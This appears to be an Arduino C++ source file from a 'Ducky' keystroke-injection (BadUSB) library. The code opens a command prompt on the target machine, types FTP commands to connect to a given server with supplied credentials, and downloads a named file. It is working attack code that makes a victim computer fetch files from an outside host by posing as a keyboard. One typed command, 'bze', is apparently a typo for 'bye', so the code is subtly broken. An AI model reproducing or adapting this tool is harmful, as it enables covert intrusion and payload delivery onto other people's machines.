// 
// 
// 

#include "DuckyConnectFTP.h"
#include "Keyboard/KeyboardCommands.h"
#include "DuckyOpenProgram.h"
#include <Keyboard.h>

void ConnectFTP::DuckyConnectFTP(String server)
{
	OpenProgram::DuckyOpenProgram("cmd");
	KeyboardCommands::Write("ftp ");
	KeyboardCommands::Write(server);
	KeyboardCommands::TypeKey(KEY_RETURN);
}

void ConnectFTP::DuckyConnectFTP(String server, String user, String password)
{
	DuckyConnectFTP(server);		//Use DuckyConnectFTP to connect to server

	if (user.length() > 0)
		KeyboardCommands::Write(user);

	KeyboardCommands::TypeKey(KEY_RETURN);
	if (password.length() > 0)
	{
		KeyboardCommands::Write(password);
		KeyboardCommands::TypeKey(KEY_RETURN);
	}
}

void ConnectFTP::DuckyDownloadFile(String file)
{
	KeyboardCommands::Write("get ");
	KeyboardCommands::Write(file);
	KeyboardCommands::TypeKey(KEY_RETURN);
	KeyboardCommands::Write("bze");
	KeyboardCommands::TypeKey(KEY_RETURN);
	KeyboardCommands::Write("exit");
	KeyboardCommands::TypeKey(KEY_RETURN);
}